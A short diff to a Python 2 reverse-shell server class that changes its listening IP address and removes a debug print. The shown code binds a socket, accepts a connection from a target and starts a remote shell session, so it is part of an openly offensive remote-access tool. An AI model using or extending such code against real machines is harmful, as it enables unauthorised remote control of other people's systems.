@@ -33,7 +33,7 @@ class reverse_shell_server:
         print "connecting to shell ... "
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        sock.bind(("192.168.2.8", 54321))
+        sock.bind(("192.168.2.10", 54321))
         sock.listen(5)
         target,ip = sock.accept()
         print "connection established starting shell ..."
@@ -45,7 +45,6 @@ class reverse_shell_server:
     def change_dir(self,command):
         prompt            = self.prompt
         command,arguments = self.get_cmd_arg(command)
-        print "cd command = ",command," agr =",arguments
         if len(arguments) > 1:
             print prompt+"[error]:too many arguments"
         elif len(arguments) == 0:
